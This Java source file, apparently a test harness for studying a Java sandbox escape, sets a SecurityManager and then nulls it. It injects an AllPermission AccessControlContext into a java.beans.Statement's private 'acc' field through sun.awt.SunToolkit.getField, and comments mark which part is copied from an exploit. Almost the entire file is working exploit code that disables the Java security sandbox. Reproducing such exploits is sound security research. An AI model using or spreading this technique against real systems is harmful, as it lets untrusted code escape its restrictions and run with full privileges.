package NullTests;
import java.beans.Expression;
import java.beans.Statement;
import java.io.File;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.security.AccessControlContext;
import java.security.AllPermission;
import java.security.cert.Certificate;
import java.security.AccessControlException;
import java.security.CodeSource;
import java.security.Permission;
import java.security.Permissions;
import java.security.Policy;
import java.security.ProtectionDomain;

public class NullSecurityManagerWithAccessControl {

	public static void main(String[] args) throws Throwable {
		SecurityManager testManager = System.getSecurityManager();
		if (testManager == null) {
			Policy.setPolicy(new AccessPermissionPolicy());
			System.setSecurityManager(new SecurityManager());
			testManager = System.getSecurityManager();
			try {
				testManager
						.checkRead("test" + File.separator + "testInput.txt");
				System.out.println("Initial policy allowed file read");
			} catch (AccessControlException e) {
				System.out.println("Initial policy prevented file read");
			}
			Statement s = new Statement(System.class, "setSecurityManager",
					new Object[1]);
			Permissions p = new Permissions();
			p.add(new AllPermission());
			ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL(
					"file:///"),
					(java.security.cert.Certificate[]) new Certificate[0]), p);
			ProtectionDomain[] pdArray = { pd };
			AccessControlContext ac = new AccessControlContext(pdArray);
			//exploits set field
			SetField(Statement.class, "acc", s, ac);
			//end of exploit's setField
			//my set field
			/*Field acc = Statement.class.getDeclaredField("acc");
			acc.setAccessible(true);
			acc.set(s, ac);*/
			//end of my set field
			System.out.println("Current statement: " + s.toString());
			s.execute();
			System.out.println("!!!Nulled the SecurityManager!!!");
			testManager.checkRead("test" + File.separator + "testInput.txt");
			System.out.println("finished");
		} else {
			System.err
					.println("Error - Security manager was already set before "
							+ "running code");
			System.exit(1);
		}
	}

	private static void SetField(Class paramClass, String paramString,
			Object paramObject1, Object paramObject2) throws Throwable {
		Object arrayOfObject[] = new Object[2];
		arrayOfObject[0] = paramClass;
		arrayOfObject[1] = paramString;
		Expression localExpression = new Expression(
				GetClass("sun.awt.SunToolkit"), "getField", arrayOfObject);
		localExpression.execute();
		((Field) localExpression.getValue()).set(paramObject1, paramObject2);
	}

	private static Class GetClass(String paramString) throws Throwable {
		Object arrayOfObject[] = new Object[1];
		arrayOfObject[0] = paramString;
		Expression localExpression = new Expression(Class.class, "forName",
				arrayOfObject);
		localExpression.execute();
		return (Class) localExpression.getValue();
	}
}
